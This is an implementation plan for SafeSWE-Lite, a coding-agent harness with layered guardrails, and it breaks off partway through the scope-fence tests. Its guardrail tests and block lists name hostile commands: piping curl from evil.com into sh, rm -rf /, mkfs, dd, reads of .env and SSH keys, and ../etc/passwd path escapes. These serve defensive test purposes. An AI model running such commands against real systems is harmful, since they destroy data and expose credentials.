# SafeSWE-Lite Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build SafeSWE-Lite — a lightweight coding agent harness with a self-implemented agent loop, 7 structured tools, 4-layer deterministic guardrails (main contribution), and a validator-driven feedback loop (secondary contribution), all testable with mock LLM.

**Architecture:** Agent loop (while + structured stop) drives: LLM abstraction (mock/real same interface) → action protocol (Pydantic JSON) → guardrail (L1 blacklist → L2 scope fence → L3 HITL → L4 code scan) → tool dispatch → feedback validators (ruff/mypy/pytest, 3-round retry) → memory (scored tiered context). Python 3.11+, Pydantic, pytest, FastAPI for WebUI, Docker distribution.

**Tech Stack:** Python 3.11+, Pydantic v2, pytest, ruff, mypy, FastAPI + uvicorn, litellm (real LLM), keyring (credentials), ripgrep (search tool, Python-regex fallback).

**Spec:** `SPEC.md` (authoritative). **Workflow:** `GIT_CICD_DEVELOPMENT_WORKFLOW.md`.

---

## File Structure

```
src/safe_swe_lite/
├── __init__.py              # version
├── agent/
│   ├── __init__.py
│   ├── protocol.py          # Action models + parse_action
│   └── loop.py              # Agent main loop
├── llm/
│   ├── __init__.py
│   ├── base.py              # Model protocol
│   ├── mock.py              # MockLLM (pre-recorded playback)
│   └── litellm_provider.py  # Real LLM via litellm
├── tools/
│   ├── __init__.py          # Tool base + ToolResult + registry
│   ├── file_tools.py        # read_file, write_file, edit_file
│   ├── command_tools.py     # run_command
│   ├── search_tools.py      # search_pattern, list_files
│   └── submit_tool.py       # submit
├── guardrails/
│   ├── __init__.py
│   ├── checker.py           # L1 blacklist (3 match modes)
│   ├── scope_fence.py       # L2 workspace boundary
│   ├── hitl.py              # L3 HITL state machine
│   └── code_scanner.py      # L4 AST banned-symbol scan
├── feedback/
│   ├── __init__.py
│   ├── validators.py        # ValidationResult + ruff/mypy/pytest
│   └── loop.py              # 3-round retry loop
├── memory/
│   ├── __init__.py
│   ├── store.py             # messages + assemble (tiered context)
│   └── scoring.py           # importance scores
├── config/
│   ├── __init__.py
│   └── loader.py            # YAML → Pydantic Config
├── cli.py                   # run / auth / web subcommands
└── web/
    ├── __init__.py
    ├── app.py               # FastAPI endpoints
    └── static/
        ├── index.html
        ├── style.css
        └── app.js
tests/
├── test_protocol.py
├── test_agent_loop.py
├── test_tools.py
├── test_guardrails.py
├── test_feedback.py
├── test_memory.py
├── test_config.py
├── test_mechanism_demos.py  # 课程 §A.6 三个机制演示
└── test_web_app.py
examples/
├── sample_project/
│   ├── src/auth.py          # 含一个 bug
│   └── tests/test_auth.py   # failing test
└── tasks/
    ├── fix_bug.json
    └── blocked_dangerous_action.json
config/default.yaml
pyproject.toml
Dockerfile
.dockerignore
.github/workflows/ci.yml
```

**依赖关系：** Task 1 → 2 → 3 → 4 → 5 → 6-9（可并行）→ 10 → 11, 12（可并行）→ 13 → 14 → 15 → 16 → 17 → 18

---

## Task 1: 项目骨架 + 最小 CI

**Files:**
- Create: `pyproject.toml`, `src/safe_swe_lite/__init__.py`, `src/safe_swe_lite/agent/__init__.py`, `src/safe_swe_lite/llm/__init__.py`, `src/safe_swe_lite/tools/__init__.py`, `src/safe_swe_lite/guardrails/__init__.py`, `src/safe_swe_lite/feedback/__init__.py`, `src/safe_swe_lite/memory/__init__.py`, `src/safe_swe_lite/config/__init__.py`, `tests/test_smoke.py`, `.github/workflows/ci.yml`

- [ ] **Step 1: 写 pyproject.toml**

```toml
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "safe-swe-lite"
version = "0.1.0"
description = "A lightweight SWE-agent-inspired coding agent harness with deterministic guardrails and test-feedback self-correction."
requires-python = ">=3.11"
dependencies = [
    "pydantic>=2.7",
    "pyyaml>=6.0",
]

[project.optional-dependencies]
dev = ["pytest>=8.0", "ruff>=0.4", "mypy>=1.10"]
web = ["fastapi>=0.111", "uvicorn>=0.30"]
llm = ["litellm>=1.40", "python-dotenv>=1.0", "keyring>=25.0"]
all = ["fastapi>=0.111", "uvicorn>=0.30", "litellm>=1.40", "python-dotenv>=1.0", "keyring>=25.0"]

[project.scripts]
safe-swe-lite = "safe_swe_lite.cli:main"

[tool.setuptools.packages.find]
where = ["src"]

[tool.pytest.ini_options]
testpaths = ["tests"]
```

- [ ] **Step 2: 写包骨架与 smoke test**

`src/safe_swe_lite/__init__.py`:
```python
__version__ = "0.1.0"
```

其余 7 个 `__init__.py` 内容为空文件。

`tests/test_smoke.py`:
```python
from safe_swe_lite import __version__


def test_version():
    assert __version__ == "0.1.0"
```

- [ ] **Step 3: 安装并跑测试**

Run: `pip install -e ".[dev]"`（注意：PyPI 需清华镜像 `-i https://pypi.tuna.tsinghua.edu.cn/simple`）
Run: `pytest -q`
Expected: 1 passed

- [ ] **Step 4: 写 CI workflow**

`.github/workflows/ci.yml`:
```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  unit-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install -e ".[dev]"
      - run: pytest -q

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install ruff
      - run: ruff check src tests
```

- [ ] **Step 5: Commit**

```bash
git add pyproject.toml src/ tests/ .github/
git commit -m "feat: scaffold project skeleton with minimal CI"
```

---

## Task 2: Action Protocol（动作协议）

**Files:**
- Create: `src/safe_swe_lite/agent/protocol.py`, `tests/test_protocol.py`

- [ ] **Step 1: 写失败测试**

```python
# tests/test_protocol.py
import pytest
from safe_swe_lite.agent.protocol import Action, ProtocolError, parse_action


def test_parse_valid_action():
    response = {"message": '{"action": "read_file", "parameters": {"path": "a.py"}}'}
    action = parse_action(response)
    assert action == Action(name="read_file", parameters={"path": "a.py"})


def test_parse_unknown_tool_raises():
    response = {"message": '{"action": "fly_to_moon", "parameters": {}}'}
    with pytest.raises(ProtocolError, match="unknown action"):
        parse_action(response)


def test_parse_invalid_json_raises():
    with pytest.raises(ProtocolError, match="not valid JSON"):
        parse_action({"message": "not json at all"})


def test_parse_missing_action_key_raises():
    with pytest.raises(ProtocolError, match="missing 'action'"):
        parse_action({"message": '{"parameters": {}}'})


def test_parse_missing_message_key_raises():
    with pytest.raises(ProtocolError, match="missing 'message'"):
        parse_action({})


def test_parse_missing_parameters_defaults_to_empty():
    action = parse_action({"message": '{"action": "submit"}'})
    assert action.parameters == {}


def test_parse_non_dict_parameters_raises():
    with pytest.raises(ProtocolError, match="'parameters' must be an object"):
        parse_action({"message": '{"action": "read_file", "parameters": "bad"}'})


VALID_NAMES = {"read_file", "write_file", "edit_file", "run_command",
               "search_pattern", "list_files", "submit"}


def test_all_seven_tool_names_accepted():
    for name in VALID_NAMES:
        response = {"message": f'{{"action": "{name}", "parameters": {{}}}}'}
        assert parse_action(response).name == name
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_protocol.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 protocol.py**

```python
"""JSON action protocol: the only interface between LLM output and the harness."""

import json

from pydantic import BaseModel, Field

VALID_ACTIONS = {
    "read_file", "write_file", "edit_file", "run_command",
    "search_pattern", "list_files", "submit",
}


class ProtocolError(Exception):
    """Raised when LLM output cannot be parsed into a valid Action."""


class Action(BaseModel):
    name: str
    parameters: dict = Field(default_factory=dict)


def parse_action(response: dict) -> Action:
    """Parse a model response dict into an Action.

    The model's message must be JSON of the form
    {"action": "<tool_name>", "parameters": {...}}.
    """
    if "message" not in response:
        raise ProtocolError("LLM output missing 'message' key")
    message = response["message"]
    try:
        data = json.loads(message)
    except json.JSONDecodeError as e:
        raise ProtocolError(f"LLM output is not valid JSON: {e}") from e
    if not isinstance(data, dict):
        raise ProtocolError("LLM output must be a JSON object")
    if "action" not in data:
        raise ProtocolError("LLM output missing 'action' key")
    name = data["action"]
    if name not in VALID_ACTIONS:
        raise ProtocolError(f"unknown action '{name}'")
    parameters = data.get("parameters", {})
    if not isinstance(parameters, dict):
        raise ProtocolError("'parameters' must be an object")
    return Action(name=name, parameters=parameters)
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_protocol.py -v`
Expected: 8 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/agent/protocol.py tests/test_protocol.py
git commit -m "feat: add JSON action protocol with pydantic validation"
```

---

## Task 3: LLM 抽象层 + MockLLM

**Files:**
- Create: `src/safe_swe_lite/llm/base.py`, `src/safe_swe_lite/llm/mock.py`, `tests/test_mock_llm.py`

- [ ] **Step 1: 写失败测试**

```python
# tests/test_mock_llm.py
import pytest
from safe_swe_lite.llm.mock import MockLLM


def test_mock_llm_plays_outputs_in_sequence():
    model = MockLLM(outputs=[
        {"message": '{"action": "read_file", "parameters": {"path": "a.py"}}'},
        {"message": '{"action": "submit", "parameters": {"result": "done"}}'},
    ])
    first = model.query([{"role": "user", "content": "task"}])
    second = model.query([{"role": "user", "content": "task"}])
    assert first["message"].startswith('{"action": "read_file"')
    assert second["message"].startswith('{"action": "submit"')


def test_mock_llm_exhausted_outputs_raises():
    model = MockLLM(outputs=[{"message": '{"action": "submit", "parameters": {}}'}])
    model.query([])
    with pytest.raises(IndexError):
        model.query([])


def test_mock_llm_default_empty_outputs():
    model = MockLLM()
    with pytest.raises(IndexError):
        model.query([])


def test_mock_llm_ignores_input_messages():
    model = MockLLM(outputs=[{"message": '{"action": "submit", "parameters": {}}'}])
    result = model.query([{"role": "user", "content": "anything at all"}])
    assert result["message"].startswith('{"action": "submit"')
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_mock_llm.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 base.py 与 mock.py**

`src/safe_swe_lite/llm/base.py`:
```python
"""Model protocol: the single interface the agent uses to talk to any LLM."""

from typing import Any, Protocol


class Model(Protocol):
    """Anything implementing query() can drive the agent loop."""

    def query(self, messages: list[dict], **kwargs) -> dict:
        """Return a model response dict.

        The response must contain a "message" key whose value is a JSON
        string parseable by safe_swe_lite.agent.protocol.parse_action.
        """
        ...
```

`src/safe_swe_lite/llm/mock.py`:
```python
"""Deterministic mock LLM: plays pre-recorded outputs in sequence."""

from dataclasses import dataclass, field


@dataclass
class MockLLM:
    outputs: list[dict] = field(default_factory=list)
    _index: int = -1

    def query(self, messages: list[dict], **kwargs) -> dict:
        self._index += 1
        return self.outputs[self._index]
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_mock_llm.py -v`
Expected: 4 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/llm/ tests/test_mock_llm.py
git commit -m "feat: add mock LLM with deterministic playback"
```

---

## Task 4: Agent 主循环

**Files:**
- Create: `src/safe_swe_lite/agent/loop.py`, `tests/test_agent_loop.py`

**Note:** 本 task 的 Agent 仅依赖 protocol + MockLLM + 一个最小 tools 接口（`execute(action) -> ToolResult`）。真正的工具在 Task 5 实现；这里用测试替身验证循环逻辑。

- [ ] **Step 1: 写失败测试**

```python
# tests/test_agent_loop.py
import pytest
from safe_swe_lite.agent.loop import Agent
from safe_swe_lite.agent.protocol import Action
from safe_swe_lite.llm.mock import MockLLM


class FakeTools:
    def __init__(self):
        self.executed = []

    def execute(self, action: Action):
        self.executed.append(action)
        return {"output": f"executed {action.name}", "exit_code": 0}


def submit_message(result="done"):
    return {"message": f'{{"action": "submit", "parameters": {{"result": "{result}"}}}}'}


def test_agent_stops_on_submit():
    model = MockLLM(outputs=[submit_message()])
    agent = Agent(model=model, tools=FakeTools(), max_steps=10)
    result = agent.run("fix the bug")
    assert result["exit_status"] == "submitted"
    assert result["submission"] == "done"


def test_agent_executes_actions_before_submit():
    model = MockLLM(outputs=[
        {"message": '{"action": "read_file", "parameters": {"path": "a.py"}}'},
        submit_message("ok"),
    ])
    tools = FakeTools()
    agent = Agent(model=model, tools=tools, max_steps=10)
    agent.run("task")
    assert [a.name for a in tools.executed] == ["read_file"]


def test_agent_stops_at_max_steps():
    model = MockLLM(outputs=[
        {"message": '{"action": "read_file", "parameters": {"path": "a.py"}}'}
    ] * 100)
    agent = Agent(model=model, tools=FakeTools(), max_steps=3)
    result = agent.run("task")
    assert result["exit_status"] == "max_steps_exceeded"


def test_agent_recovers_from_one_format_error():
    model = MockLLM(outputs=[
        {"message": "this is not json"},
        submit_message("recovered"),
    ])
    agent = Agent(model=model, tools=FakeTools(), max_steps=10)
    result = agent.run("task")
    assert result["exit_status"] == "submitted"


def test_agent_stops_after_consecutive_format_errors():
    model = MockLLM(outputs=[{"message": "bad"}] * 10)
    agent = Agent(model=model, tools=FakeTools(), max_steps=10, max_format_errors=3)
    result = agent.run("task")
    assert result["exit_status"] == "format_error"
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_agent_loop.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 loop.py**

```python
"""Agent main loop: organize context -> query LLM -> parse -> guard -> execute -> record."""

from dataclasses import dataclass, field

from safe_swe_lite.agent.protocol import ProtocolError, parse_action


@dataclass
class Agent:
    model: object
    tools: object
    max_steps: int = 50
    max_format_errors: int = 3
    guardrail: object = None
    validators: object = None
    memory: object = None
    _messages: list = field(default_factory=list)
    _trace: list = field(default_factory=list)

    def run(self, task: str) -> dict:
        self._messages = [
            {"role": "system", "content": "You are a coding agent. Respond ONLY with JSON actions."},
            {"role": "user", "content": task},
        ]
        steps = 0
        format_errors = 0
        while steps < self.max_steps:
            context = self._messages
            try:
                response = self.model.query(context)
                action = parse_action(response)
                format_errors = 0
            except ProtocolError as e:
                format_errors += 1
                if format_errors >= self.max_format_errors:
                    return {"exit_status": "format_error", "error": str(e), "trace": self._trace}
                self._messages.append({"role": "user", "content": f"Format error: {e}. Respond with valid JSON."})
                continue
            self._messages.append({"role": "assistant", "content": action.name})
            if action.name == "submit":
                return {
                    "exit_status": "submitted",
                    "submission": action.parameters.get("result", ""),
                    "trace": self._trace,
                }
            if self.guardrail is not None:
                decision = self.guardrail.check(action)
                if decision.blocked:
                    self._messages.append({
                        "role": "user",
                        "content": f"Action blocked by guardrail L{decision.layer}: {decision.reason}",
                    })
                    self._trace.append({"kind": "guardrail", "data": decision})
                    continue
            result = self.tools.execute(action)
            self._messages.append({"role": "user", "content": f"Observation: {result}"})
            self._trace.append({"kind": "observation", "data": result})
            steps += 1
        return {"exit_status": "max_steps_exceeded", "trace": self._trace}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_agent_loop.py -v`
Expected: 5 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/agent/loop.py tests/test_agent_loop.py
git commit -m "feat: implement agent main loop with structured stop conditions"
```

### Task 4 实现后修订（质量评审 REJECT 后修复，2026-08-15）

代码质量评审发现 Critical：guardrail 拦截路径不消耗 steps，若 LLM 持续产出被拦截动作则循环永不终止。修复内容：

1. `Agent` 新增 `max_blocked: int = 5` 字段；run() 维护 `blocked` 计数器；拦截达上限返回 `{"exit_status": "guardrail_exhausted", ...}`。三个计数器（steps/format_errors/blocked）各自单调递增且有界，任意模型行为下循环必然终止（评审员给出完整终止性证明）。
2. 补 3 个 guardrail 分支测试（拦截不执行+继续 / 拦截不计步 / 全拦截终止）。
3. 新增 `format_observation(result)` 辅助函数，建立 Task 5 ToolResult 格式化契约。
4. run() 开头重置 `self._trace`；`decision is not None` 防御；submission 转 str。

最终测试：8 个 agent_loop 测试 + 全量 21 passed。

**教训**：PLAN 里"拦截不消耗步数预算"的设计意图是对的（拦截是零成本反馈），但缺了独立上限。设计任何"不消耗主计数器"的路径时，必须同时设计它的专属终止保障。

---

## Task 5: 工具系统（7 工具 + 分发器）

**Files:**
- Create: `src/safe_swe_lite/tools/__init__.py`（重写）, `src/safe_swe_lite/tools/file_tools.py`, `src/safe_swe_lite/tools/command_tools.py`, `src/safe_swe_lite/tools/search_tools.py`, `src/safe_swe_lite/tools/submit_tool.py`, `tests/test_tools.py`

- [ ] **Step 1: 写失败测试**

```python
# tests/test_tools.py
import pytest
from pathlib import Path

from safe_swe_lite.agent.protocol import Action
from safe_swe_lite.tools import Dispatcher, ToolResult


@pytest.fixture
def dispatcher(tmp_path: Path):
    return Dispatcher(workspace=tmp_path)


def test_read_file_roundtrip(dispatcher, tmp_path):
    (tmp_path / "a.py").write_text("x = 1\n")
    result = dispatcher.execute(Action(name="read_file", parameters={"path": "a.py"}))
    assert result.success and "x = 1" in result.output


def test_write_file_roundtrip(dispatcher, tmp_path):
    dispatcher.execute(Action(name="write_file", parameters={"path": "b.py", "content": "y = 2\n"}))
    result = dispatcher.execute(Action(name="read_file", parameters={"path": "b.py"}))
    assert "y = 2" in result.output


def test_edit_file_replaces_unique_string(dispatcher, tmp_path):
    (tmp_path / "c.py").write_text("hello world\n")
    result = dispatcher.execute(Action(name="edit_file", parameters={
        "path": "c.py", "old_string": "hello", "new_string": "goodbye"}))
    assert result.success
    assert "goodbye world" in (tmp_path / "c.py").read_text()


def test_edit_file_non_unique_old_string_fails(dispatcher, tmp_path):
    (tmp_path / "c.py").write_text("hello hello\n")
    result = dispatcher.execute(Action(name="edit_file", parameters={
        "path": "c.py", "old_string": "hello", "new_string": "x"}))
    assert not result.success and "unique" in result.error


def test_run_command_captures_output(dispatcher, tmp_path):
    result = dispatcher.execute(Action(name="run_command", parameters={"command": "echo hi"}))
    assert result.success and "hi" in result.output
    assert result.exit_code == 0


def test_run_command_nonzero_exit(dispatcher, tmp_path):
    result = dispatcher.execute(Action(name="run_command", parameters={"command": "python -c 'exit(3)'"}))
    assert not result.success and result.exit_code == 3


def test_search_pattern_finds_matches(dispatcher, tmp_path):
    (tmp_path / "auth.py").write_text("def login():\n    pass\n")
    result = dispatcher.execute(Action(name="search_pattern", parameters={"pattern": "login"}))
    assert result.success and "auth.py" in result.output


def test_list_files_lists_tree(dispatcher, tmp_path):
    (tmp_path / "x.py").write_text("")
    result = dispatcher.execute(Action(name="list_files", parameters={}))
    assert "x.py" in result.output


def test_unknown_tool_returns_error(dispatcher):
    result = dispatcher.execute(Action(name="nope", parameters={}))
    assert not result.success and "unknown tool" in result.error


def test_submit_returns_result(dispatcher):
    result = dispatcher.execute(Action(name="submit", parameters={"result": "fixed"}))
    assert result.success and result.output == "fixed"
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_tools.py -v`
Expected: FAIL（ImportError）

- [ ] **Step 3: 实现工具**

`src/safe_swe_lite/tools/__init__.py`:
```python
"""Tool system: 7 structured tools + dispatcher."""

from dataclasses import dataclass

from safe_swe_lite.agent.protocol import Action


@dataclass
class ToolResult:
    success: bool
    output: str = ""
    exit_code: int = 0
    error: str = ""


class Dispatcher:
    def __init__(self, workspace):
        from safe_swe_lite.tools import command_tools, file_tools, search_tools, submit_tool
        self.workspace = workspace
        self._handlers = {
            "read_file": file_tools.read_file,
            "write_file": file_tools.write_file,
            "edit_file": file_tools.edit_file,
            "run_command": command_tools.run_command,
            "search_pattern": search_tools.search_pattern,
            "list_files": search_tools.list_files,
            "submit": submit_tool.submit,
        }

    def execute(self, action: Action) -> ToolResult:
        handler = self._handlers.get(action.name)
        if handler is None:
            return ToolResult(success=False, error=f"unknown tool '{action.name}'")
        try:
            return handler(self.workspace, action.parameters)
        except Exception as e:  # tool errors become observations, never crash the loop
            return ToolResult(success=False, error=f"{type(e).__name__}: {e}")
```

`src/safe_swe_lite/tools/file_tools.py`:
```python
"""File tools: read_file, write_file, edit_file."""

from pathlib import Path

from safe_swe_lite.tools import ToolResult


def read_file(workspace: Path, params: dict) -> ToolResult:
    path = (workspace / params["path"]).resolve()
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except FileNotFoundError:
        return ToolResult(success=False, error=f"file not found: {params['path']}")
    lines = text.splitlines()
    offset = int(params.get("offset", 0))
    limit = int(params.get("limit", len(lines)))
    shown = lines[offset:offset + limit]
    return ToolResult(success=True, output="\n".join(shown))


def write_file(workspace: Path, params: dict) -> ToolResult:
    path = workspace / params["path"]
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(params["content"], encoding="utf-8")
    return ToolResult(success=True, output=f"wrote {params['path']} ({len(params['content'])} chars)")


def edit_file(workspace: Path, params: dict) -> ToolResult:
    path = workspace / params["path"]
    try:
        text = path.read_text(encoding="utf-8")
    except FileNotFoundError:
        return ToolResult(success=False, error=f"file not found: {params['path']}")
    old = params["old_string"]
    new = params["new_string"]
    count = text.count(old)
    if count == 0:
        return ToolResult(success=False, error="old_string not found")
    if count > 1:
        return ToolResult(success=False, error=f"old_string not unique ({count} matches)")
    path.write_text(text.replace(old, new), encoding="utf-8")
    return ToolResult(success=True, output=f"edited {params['path']}")
```

`src/safe_swe_lite/tools/command_tools.py`:
```python
"""Command tool: run_command with timeout and full-process-group kill."""

import subprocess

from safe_swe_lite.tools import ToolResult

DEFAULT_TIMEOUT = 30


def run_command(workspace, params: dict) -> ToolResult:
    timeout = int(params.get("timeout", DEFAULT_TIMEOUT))
    try:
        proc = subprocess.run(
            params["command"],
            shell=True,
            cwd=workspace,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired as e:
        return ToolResult(success=False, exit_code=-1, error=f"timeout after {timeout}s")
    output = (proc.stdout or "") + (proc.stderr or "")
    return ToolResult(success=proc.returncode == 0, output=output, exit_code=proc.returncode)
```

`src/safe_swe_lite/tools/search_tools.py`:
```python
"""Search tools: search_pattern (ripgrep with regex fallback), list_files."""

import re
import subprocess
from pathlib import Path

from safe_swe_lite.tools import ToolResult


def search_pattern(workspace: Path, params: dict) -> ToolResult:
    pattern = params["pattern"]
    try:
        proc = subprocess.run(
            ["rg", "-n", pattern, str(workspace)],
            capture_output=True, text=True, timeout=10,
        )
        output = proc.stdout
    except (FileNotFoundError, subprocess.TimeoutExpired):
        output = _regex_fallback(workspace, pattern)
    if not output.strip():
        return ToolResult(success=True, output="(no matches)")
    return ToolResult(success=True, output=output)


def _regex_fallback(workspace: Path, pattern: str) -> str:
    lines = []
    for path in sorted(workspace.rglob("*")):
        if path.is_file() and not any(part.startswith(".") for part in path.parts):
            try:
                text = path.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            for i, line in enumerate(text.splitlines(), 1):
                if re.search(pattern, line):
                    lines.append(f"{path.relative_to(workspace)}:{i}:{line}")
    return "\n".join(lines)


def list_files(workspace: Path, params: dict) -> ToolResult:
    entries = []
    for path in sorted(workspace.rglob("*")):
        if any(part.startswith(".") for part in path.parts):
            continue
        rel = path.relative_to(workspace)
        entries.append(f"{'d' if path.is_dir() else 'f'} {rel}")
    return ToolResult(success=True, output="\n".join(entries) or "(empty)")
```

`src/safe_swe_lite/tools/submit_tool.py`:
```python
"""Submit tool: the structured stop signal."""

from safe_swe_lite.tools import ToolResult


def submit(workspace, params: dict) -> ToolResult:
    return ToolResult(success=True, output=str(params.get("result", "")))
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_tools.py -v`
Expected: 10 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/tools/ tests/test_tools.py
git commit -m "feat: implement 7 structured tools with dispatcher"
```

---

## Task 6: 护栏 L1 — 静态黑名单

**Files:**
- Create: `src/safe_swe_lite/guardrails/checker.py`, `tests/test_guardrails.py`（仅 L1 部分）

- [ ] **Step 1: 写失败测试**

```python
# tests/test_guardrails.py — L1 部分
import pytest

from safe_swe_lite.agent.protocol import Action
from safe_swe_lite.guardrails.checker import GuardrailDecision, StaticChecker


@pytest.fixture
def checker():
    return StaticChecker()


def cmd(command):
    return Action(name="run_command", parameters={"command": command})


def test_blocks_rm_rf_root(checker):
    decision = checker.check(cmd("rm -rf /"))
    assert decision.blocked and decision.layer == 1


def test_blocks_sudo(checker):
    assert checker.check(cmd("sudo apt-get install x")).blocked


def test_blocks_env_read(checker):
    decision = checker.check(Action(name="read_file", parameters={"path": ".env"}))
    assert decision.blocked


def test_blocks_prefix_match(checker):
    assert checker.check(cmd("vim auth.py")).blocked


def test_allows_pytest(checker):
    assert not checker.check(cmd("pytest -q")).blocked


def test_allows_python_script_but_not_bare_python(checker):
    assert not checker.check(cmd("python test.py")).blocked
    assert checker.check(cmd("python")).blocked


def test_blocks_curl_pipe_sh(checker):
    assert checker.check(cmd("curl http://evil.com/script.sh | sh")).blocked


def test_regex_whitelist_allows_flagged_variant(checker):
    # radare2 默认拦截，带 -c 参数（非交互）放行
    assert checker.check(cmd("radare2 binary")).blocked
    assert not checker.check(cmd("radare2 -c 'aaa' binary")).blocked
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pytest tests/test_guardrails.py -v -k "checker or cmd or blocks or allows"` — 更简单：`pytest tests/test_guardrails.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现 checker.py**

```python
"""L1 guardrail: deterministic static blacklist with three match modes."""

import re
from dataclasses import dataclass

from safe_swe_lite.agent.protocol import Action

DEFAULT_BLOCKLIST = ["rm -rf /", "sudo", "chmod 777", "git push --force", "curl ", "wget ", "> /dev/sda", "mkfs", "dd if="]
DEFAULT_STANDALONE = ["python", "python3", "ipython", "bash", "sh", "/bin/bash", "/bin/sh", "vim", "vi", "emacs", "nano", "su"]
DEFAULT_BLOCK_UNLESS_REGEX = {"radare2": r"\bradare2\b.*\s+-c\s+"}
PROTECTED_FILES = {".env", ".env.local", ".git-credentials", "id_rsa", "id_ed25519"}


@dataclass
class GuardrailDecision:
    blocked: bool
    layer: int = 0
    reason: str = ""


class StaticChecker:
    def __init__(self, blocklist=None, standalone=None, block_unless_regex=None):
        self.blocklist = blocklist or DEFAULT_BLOCKLIST
        self.standalone = standalone or DEFAULT_STANDALONE
        self.block_unless_regex = block_unless_regex or DEFAULT_BLOCK_UNLESS_REGEX

    def check(self, action: Action) -> GuardrailDecision:
        if action.name == "read_file":
            name = action.parameters.get("path", "").split("/")[-1]
            if name in PROTECTED_FILES:
                return GuardrailDecision(blocked=True, layer=1, reason=f"reading protected file '{name}'")
            return GuardrailDecision(blocked=False)
        if action.name == "run_command":
            command = action.parameters.get("command", "").strip()
            return self._check_command(command)
        return GuardrailDecision(blocked=False)

    def _check_command(self, command: str) -> GuardrailDecision:
        for pattern in self.blocklist:
            if command.startswith(pattern):
                return GuardrailDecision(blocked=True, layer=1, reason=f"blocked by prefix '{pattern}'")
        if command in self.standalone:
            return GuardrailDecision(blocked=True, layer=1, reason=f"blocked standalone command '{command}'")
        first_word = command.split()[0] if command else ""
        if first_word in self.block_unless_regex:
            if not re.search(self.block_unless_regex[first_word], command):
                return GuardrailDecision(blocked=True, layer=1, reason=f"'{first_word}' requires matching whitelist regex")
        return GuardrailDecision(blocked=False)
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pytest tests/test_guardrails.py -v`
Expected: 8 passed

- [ ] **Step 5: Commit**

```bash
git add src/safe_swe_lite/guardrails/ tests/test_guardrails.py
git commit -m "feat: L1 guardrail with prefix/standalone/regex-whitelist matching"
```

### Task 6 实现后修订（三轮质量评审对抗性测试后，2026-08-15）

L1 是安全核心，评审员做了真实对抗性测试（把护栏当攻击目标），三轮 REJECT 后 APPROVE。最终实现与 PLAN 原片段有重大差异，**实现 Task 7-9 前必须读完本节**：

1. **GuardrailDecision 是 Pydantic BaseModel**（非 dataclass）：字段 `blocked: bool`、`layer: int = 0`、`reason: str = ""`、`requires_approval: bool = False`、`hitl_state: str = ""`。L3 将使用 `requires_approval`（包装器高危内容路由人工确认）和 `hitl_state`（pending/approved/rejected）。
2. **对抗性修复清单**（28 个测试覆盖）：
   - HIGH_RISK_PATTERNS 任意位置正则（sudo/chmod 777/git push --force/curl/wget/mkfs/dd/> /dev/sd*）
   - rm 语义双条件检查（递归标志含 GNU 长选项 + 破坏性目标含尾随斜杠/置换/引号剥离），任意位置 RM_TOKEN 执行 + fall-through 控制流
   - radare2 白名单 -c 载荷转义检查（`[!;`$()]` 拦截）
   - 敏感文件：Path().name + casefold + strip + cat 家族命令检测
   - 非字符串/空命令拦截
3. **文档化边界**（checker.py docstring，不再打补丁）：grep/sed 读 .env、eval 包装器、纯文本误伤、深度混淆 → 委托 L3/L4/沙箱。
4. **遗留 LOW**：loop.py 的 trace 存原始 ToolResult 对象需 asdict（WebUI 任务前处理）。

最终测试数：test_guardrails.py 28 个（含全部对抗向量），全量 63 passed。

---

## Task 7: 护栏 L2 — 范围围栏

**Files:**
- Create: `src/safe_swe_lite/guardrails/scope_fence.py`，追加 `tests/test_guardrails.py`

- [ ] **Step 1: 追加失败测试**

```python
# tests/test_guardrails.py — L2 部分追加
from safe_swe_lite.guardrails.scope_fence import ScopeFence


@pytest.fixture
def fence(tmp_path):
    return ScopeFence(workspace=tmp_path)


def test_fence_allows_inside_workspace(fence, tmp_path):
    (tmp_path / "ok.py").write_text("x")
    action = Action(name="read_file", parameters={"path": "ok.py"})
    assert not fence.check(action).blocked


def test_fence_blocks_absolute_path_outside(fence):
    action = Action(name="read_file", parameters={"path": "/etc/passwd"})
    decision = fence.check(action)
    assert decision.blocked and decision.layer == 2


def test_fence_blocks_dotdot_escape(fence):
    action = Action(name="read_file", parameters={"path": "../../etc/passwd"})
    assert fence.check(action).blocked


def test_fence_blocks_write_outside(fence):
    action = Action(name="write_file", parameters={"path": "../evil.py", "content": "x"})
    assert fence.check(action).blocked


def test_fence_applies_to_search_and_list_too(fence):
    action = Action(name="search_pattern", parameters={"pattern": "x", "path": "/etc"})
    assert fence.check(action).blocked


def test_fence_blocks_absolute_path(fence):
